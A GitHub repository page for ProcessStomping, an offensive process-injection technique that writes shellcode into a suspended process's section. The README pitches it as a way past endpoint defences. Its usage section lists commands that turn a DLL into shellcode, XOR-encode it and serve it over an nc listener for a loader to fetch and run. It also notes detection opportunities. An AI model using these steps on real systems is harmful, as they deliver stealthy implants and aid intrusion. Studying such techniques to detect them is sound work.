# https://github.com/naksyn/ProcessStomping

[Skip to content](https://github.com/naksyn/ProcessStomping#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/naksyn/ProcessStomping) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/naksyn/ProcessStomping) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/naksyn/ProcessStomping) to refresh your session.Dismiss alert

{{ message }}

[naksyn](https://github.com/naksyn)/ **[ProcessStomping](https://github.com/naksyn/ProcessStomping)** Public

- [Notifications](https://github.com/login?return_to=%2Fnaksyn%2FProcessStomping) You must be signed in to change notification settings
- [Fork\\
27](https://github.com/login?return_to=%2Fnaksyn%2FProcessStomping)
- [Star\\
148](https://github.com/login?return_to=%2Fnaksyn%2FProcessStomping)


A variation of ProcessOverwriting to execute shellcode on an executable's section


### License

[Apache-2.0 license](https://github.com/naksyn/ProcessStomping/blob/main/LICENSE)

[148\\
stars](https://github.com/naksyn/ProcessStomping/stargazers) [27\\
forks](https://github.com/naksyn/ProcessStomping/forks) [Branches](https://github.com/naksyn/ProcessStomping/branches) [Tags](https://github.com/naksyn/ProcessStomping/tags) [Activity](https://github.com/naksyn/ProcessStomping/activity)

[Star](https://github.com/login?return_to=%2Fnaksyn%2FProcessStomping)

[Notifications](https://github.com/login?return_to=%2Fnaksyn%2FProcessStomping) You must be signed in to change notification settings

# naksyn/ProcessStomping

main

[**1** Branch](https://github.com/naksyn/ProcessStomping/branches) [**0** Tags](https://github.com/naksyn/ProcessStomping/tags)

[Go to Branches page](https://github.com/naksyn/ProcessStomping/branches)[Go to Tags page](https://github.com/naksyn/ProcessStomping/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![naksyn](https://avatars.githubusercontent.com/u/59816245?v=4&size=40)](https://github.com/naksyn)[naksyn](https://github.com/naksyn/ProcessStomping/commits?author=naksyn)<br>[Merge pull request](https://github.com/naksyn/ProcessStomping/commit/d94be6f31329ebcacddbad9397613558b3d051bd) [#2](https://github.com/naksyn/ProcessStomping/pull/2) [from frkngksl/main](https://github.com/naksyn/ProcessStomping/commit/d94be6f31329ebcacddbad9397613558b3d051bd)<br>Open commit details<br>3 years agoDec 16, 2023<br>[d94be6f](https://github.com/naksyn/ProcessStomping/commit/d94be6f31329ebcacddbad9397613558b3d051bd) · 3 years agoDec 16, 2023<br>## History<br>[6 Commits](https://github.com/naksyn/ProcessStomping/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/naksyn/ProcessStomping/commits/main/) 6 Commits |
| [ProcessStomping](https://github.com/naksyn/ProcessStomping/tree/main/ProcessStomping "ProcessStomping") | [ProcessStomping](https://github.com/naksyn/ProcessStomping/tree/main/ProcessStomping "ProcessStomping") | [Solve Minor Entry Point Bug for x64](https://github.com/naksyn/ProcessStomping/commit/6ebdd6b87395931f310436652f414228f993f261 "Solve Minor Entry Point Bug for x64") | 3 years agoDec 15, 2023 |
| [sRDI-master](https://github.com/naksyn/ProcessStomping/tree/main/sRDI-master "sRDI-master") | [sRDI-master](https://github.com/naksyn/ProcessStomping/tree/main/sRDI-master "sRDI-master") | [Initial commit](https://github.com/naksyn/ProcessStomping/commit/f55c9fe9d26ba313cf9322de3a15002a655f4337 "Initial commit") | 3 years agoNov 17, 2023 |
| [LICENSE](https://github.com/naksyn/ProcessStomping/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/naksyn/ProcessStomping/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/naksyn/ProcessStomping/commit/c7eea64a6e61550b7896a7b3778d1c39a1a47a67 "Initial commit") | 3 years agoNov 17, 2023 |
| [README.md](https://github.com/naksyn/ProcessStomping/blob/main/README.md "README.md") | [README.md](https://github.com/naksyn/ProcessStomping/blob/main/README.md "README.md") | [Update README.md](https://github.com/naksyn/ProcessStomping/commit/7ab1f0cea555f4599e1c7075e5bcc556618e8cab "Update README.md") | 3 years agoNov 18, 2023 |
| [xor.py](https://github.com/naksyn/ProcessStomping/blob/main/xor.py "xor.py") | [xor.py](https://github.com/naksyn/ProcessStomping/blob/main/xor.py "xor.py") | [Initial commit](https://github.com/naksyn/ProcessStomping/commit/f55c9fe9d26ba313cf9322de3a15002a655f4337 "Initial commit") | 3 years agoNov 17, 2023 |
| View all files |

## Repository files navigation

# ProcessStomping

[Permalink: ProcessStomping](https://github.com/naksyn/ProcessStomping#processstomping)

A variation of ProcessOverwriting to execute shellcode on an executable's section

[![Twitter](https://camo.githubusercontent.com/3e2a6c7ad8f60db1d64964d88909cd29669e20118b51380a0ad11b261f7dd4ad/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6e616b73796e3f6c6162656c3d6e616b73796e267374796c653d736f6369616c)](https://twitter.com/intent/follow?screen_name=naksyn)

# What is it

[Permalink: What is it](https://github.com/naksyn/ProcessStomping#what-is-it)

For a more detailed explanation you can read my [blog post](https://www.naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html)

Process Stomping, is a variation of [hasherezade’s Process Overwriting](https://github.com/hasherezade/process_overwriting) and it has the advantage of writing a shellcode payload on a targeted section instead of writing a whole PE payload over the hosting process address space.

These are the main steps of the ProcessStomping technique:

1. **CreateProcess** \- setting the Process Creation Flag to CREATE\_SUSPENDED (0x00000004) in order to suspend the processes primary thread.
2. **WriteProcessMemory** \- used to write each malicious shellcode to the target process section.
3. **SetThreadContext** \- used to point the entrypoint to a new code section that it has written.
4. **ResumeThread** \- self-explanatory.

As an example application of the technique, the PoC can be used with [sRDI](https://github.com/monoxgas/sRDI) to load a beacon dll over an executable RWX section. The following picture describes the steps involved.

[![immagine](https://private-user-images.githubusercontent.com/59816245/283995876-cbc488c4-79ef-4779-9373-8f137b8e97f1.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5MDgsIm5iZiI6MTc3MTQxMjYwOCwicGF0aCI6Ii81OTgxNjI0NS8yODM5OTU4NzYtY2JjNDg4YzQtNzllZi00Nzc5LTkzNzMtOGYxMzdiOGU5N2YxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDMyOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU3ZWMyZjhkZTg0NzNlNGJlOTI5ZTE3MDdhOTU0YWU0Mzg2Y2I5ODczOGI1N2IzYmUyNDg0ZmI0MmJmMGFjZmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.XMYYDqDZyFwjxtVy2pSb2bH0A_XbP88IjkwLsub-Np4)](https://private-user-images.githubusercontent.com/59816245/283995876-cbc488c4-79ef-4779-9373-8f137b8e97f1.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5MDgsIm5iZiI6MTc3MTQxMjYwOCwicGF0aCI6Ii81OTgxNjI0NS8yODM5OTU4NzYtY2JjNDg4YzQtNzllZi00Nzc5LTkzNzMtOGYxMzdiOGU5N2YxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDMyOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU3ZWMyZjhkZTg0NzNlNGJlOTI5ZTE3MDdhOTU0YWU0Mzg2Y2I5ODczOGI1N2IzYmUyNDg0ZmI0MmJmMGFjZmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.XMYYDqDZyFwjxtVy2pSb2bH0A_XbP88IjkwLsub-Np4)

# Disclaimer

[Permalink: Disclaimer](https://github.com/naksyn/ProcessStomping#disclaimer)

All information and content is provided for educational purposes only. Follow instructions at your own risk. Neither the author nor his employer are responsible for any direct or consequential damage or loss arising from any person or organization.

# Credits

[Permalink: Credits](https://github.com/naksyn/ProcessStomping#credits)

This work has been made possible because of the knowledge and tools shared by Aleksandra Doniec @ [hasherezade](https://twitter.com/hasherezade) and [Nick Landers](https://twitter.com/monoxgas).

# Usage

[Permalink: Usage](https://github.com/naksyn/ProcessStomping#usage)

Select your target process and modify global variables accordingly in ProcessStomping.cpp.

Compile the sRDI project making sure that the offset is enough to jump over your generated sRDI shellcode blob and then update the sRDI tools:

`cd \sRDI-master`

`python .\lib\Python\EncodeBlobs.py .\`

Generate a Reflective-Loaderless dll payload of your choice and then generate sRDI shellcode blob:

`python .\lib\Python\ConvertToShellcode.py -b -f "changethedefault" .\noRLx86.dll`

The shellcode blob can then be xored with a key-word and downloaded using a simple socket

`python xor.py noRLx86.bin noRLx86_enc.bin Bangarang`

Deliver the xored blob upon connection

`nc -vv -l -k -p 8000 -w 30 < noRLx86_enc.bin`

The sRDI blob will get erased after execution to remove unneeded artifacts.

### Demo

[Permalink: Demo](https://github.com/naksyn/ProcessStomping#demo)

procstomping.mp4

# Caveats

[Permalink: Caveats](https://github.com/naksyn/ProcessStomping#caveats)

To successfully execute this technique you should select the right target process and use a dll payload that doesn't come with a User Defined Reflective loader.

# Detection opportunities

[Permalink: Detection opportunities](https://github.com/naksyn/ProcessStomping#detection-opportunities)

Process Stomping technique requires starting the target process in a suspended state, changing the thread's entry point, and then resuming the thread to execute the injected shellcode. These are operations that might be considered suspicious if performed in quick succession and could lead to increased scrutiny by some security solutions.

## About

A variation of ProcessOverwriting to execute shellcode on an executable's section


### Resources

[Readme](https://github.com/naksyn/ProcessStomping#readme-ov-file)

### License

[Apache-2.0 license](https://github.com/naksyn/ProcessStomping#Apache-2.0-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/naksyn/ProcessStomping).

[Activity](https://github.com/naksyn/ProcessStomping/activity)

### Stars

[**148**\\
stars](https://github.com/naksyn/ProcessStomping/stargazers)

### Watchers

[**1**\\
watching](https://github.com/naksyn/ProcessStomping/watchers)

### Forks

[**27**\\
forks](https://github.com/naksyn/ProcessStomping/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fnaksyn%2FProcessStomping&report=naksyn+%28user%29)

## [Releases](https://github.com/naksyn/ProcessStomping/releases)

No releases published

## [Packages\  0](https://github.com/users/naksyn/packages?repo_name=ProcessStomping)

No packages published

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/naksyn/ProcessStomping).

## [Contributors\  2](https://github.com/naksyn/ProcessStomping/graphs/contributors)

- [![@naksyn](https://avatars.githubusercontent.com/u/59816245?s=64&v=4)](https://github.com/naksyn)[**naksyn** Diego Capriotti](https://github.com/naksyn)
- [![@frkngksl](https://avatars.githubusercontent.com/u/26549173?s=64&v=4)](https://github.com/frkngksl)[**frkngksl** Furkan Göksel](https://github.com/frkngksl)

## Languages

- [PowerShell42.5%](https://github.com/naksyn/ProcessStomping/search?l=powershell)
- [C#21.0%](https://github.com/naksyn/ProcessStomping/search?l=c%23)
- [C++15.5%](https://github.com/naksyn/ProcessStomping/search?l=c%2B%2B)
- [Python12.7%](https://github.com/naksyn/ProcessStomping/search?l=python)
- [C8.3%](https://github.com/naksyn/ProcessStomping/search?l=c)

You can’t perform that action at this time.